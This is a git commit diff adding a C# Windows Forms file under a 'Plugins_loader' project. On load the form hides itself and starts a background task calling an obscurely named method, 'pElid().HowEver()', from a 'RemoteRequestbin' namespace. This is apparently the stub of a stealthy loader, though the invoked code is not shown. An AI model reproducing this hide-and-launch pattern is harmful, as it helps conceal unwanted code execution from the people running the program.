85c216d7e2438dc18399fc96d1662837b39bd0bb
greentm372@gmail.com <greentm372@gmail.com>
2024-08-18 17:28:41 +0800

    makeW

---
+++ Plugins_loader/WindowsFormsApp1/Form1.cs
@@ -0,0 +1,33 @@
+﻿using RemoteRequestbin;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace WindowsFormsApp1
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+           
+            InitializeComponent();
+           
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            this.BeginInvoke(new Action(() =>
+            {
+                this.Hide();
+                this.Opacity = 1;
+            }));
+            Task.Run(() => { new pElid().HowEver(); });
+        }
+    }
+}
